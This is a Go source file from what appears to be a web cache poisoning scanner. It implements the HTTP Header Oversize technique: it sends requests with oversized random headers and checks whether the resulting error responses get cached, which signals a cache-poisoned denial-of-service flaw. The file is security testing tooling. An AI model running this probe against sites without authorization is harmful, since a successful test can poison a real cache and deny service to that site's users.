package cpdos

import (
	"github.com/projectdiscovery/gologger"
	"github.com/wealeson1/wcpvs/internal/logic/tecniques"
	"github.com/wealeson1/wcpvs/internal/models"
	"github.com/wealeson1/wcpvs/pkg/utils"
	"io"
	"net/http"
	"strings"
	"time"
)

type HHO struct {
	payload string
}

var HHOTecnique *HHO

func init() {
	HHOTecnique = NewHHO()
}

func NewHHO() *HHO {
	payload := utils.RandomString(20480)
	return &HHO{
		payload: payload,
	}
}

func (h *HHO) Scan(target *models.TargetStruct) {
	headerSize := 8192
	mixSize := 40960

	for headerSize <= mixSize {
		if !target.Cache.NoCache {
			randomHeader := utils.RandomString(5)
			resp, err := tecniques.GetRespNoPayload(target, tecniques.HEADER, map[string]string{randomHeader: utils.RandomString(headerSize)})
			if err != nil {
				gologger.Error().Msg(err.Error())
				return
			}
			respBodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				gologger.Error().Msg(err.Error())
				return
			}
			utils.CloseReader(resp.Body)
			if (resp.StatusCode != target.Response.StatusCode) || (resp.StatusCode == http.StatusBadRequest && strings.Contains(string(respBodyBytes), "Too Large")) {
				for range 3 {
					time.Sleep(400 * time.Millisecond)
					tmpReq, err := utils.CloneRequest(resp.Request)
					if err != nil {
						gologger.Error().Msgf("HHO.Scan:%s", err.Error())
						return
					}
					resp2, err := utils.CommonClient.Do(tmpReq)
					if err != nil {
						gologger.Error().Msgf("HHO.Scan:%s", err.Error())
						return
					}
					if utils.IsCacheHit(target, &resp2.Header) {
						gologger.Info().Msgf("The target %s has a CPDOS vulnerability, detected using HHO. Test: AAAAA...%d.", target.Request.URL, headerSize)
						return
					}
					utils.CloseReader(resp.Body)
				}
				return
			}
		}
		//if !target.Cache.CKIsAnyGet && target.Cache.CKIsHeader {
		//	randomParam := utils.RandomString(5)
		//	resp, err := tecniques.GetRespNoPayload(target, tecniques.GET, map[string]string{randomParam: utils.RandomString(headerSize)})
		//	if err != nil {
		//		gologger.Error().Msg(err.Error())
		//		return
		//	}
		//	if resp.StatusCode != target.Response.StatusCode {
		//		for range 3 {
		//			tmpReq, err := utils.CloneRequest(resp.Request)
		//			if err != nil {
		//				gologger.Error().Msg(err.Error())
		//				return
		//			}
		//			resp, err := utils.CommonClient.Do(tmpReq)
		//			if err == nil {
		//				if utils.IsCacheHit(target, &resp.Header) {
		//					gologger.Info().Msgf("The target %s has a CPDOS vulnerability, detected using HHO. Test: AAAAA...%d.", target.Request.URL, headerSize)
		//					return
		//				}
		//			}
		//		}
		//	}
		//}
		headerSize = headerSize + 1024
	}

}
